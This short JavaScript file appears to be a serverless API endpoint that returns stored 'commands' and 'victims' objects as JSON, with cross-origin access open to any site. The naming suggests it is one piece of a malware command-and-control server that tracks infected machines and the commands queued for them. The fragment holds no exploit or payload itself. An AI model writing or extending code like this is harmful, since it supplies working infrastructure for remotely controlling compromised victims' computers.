// api/ver-commands.js
export default function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    res.status(200).json({
        commands: global.commands || {},
        victims: global.victims || {}
    });
}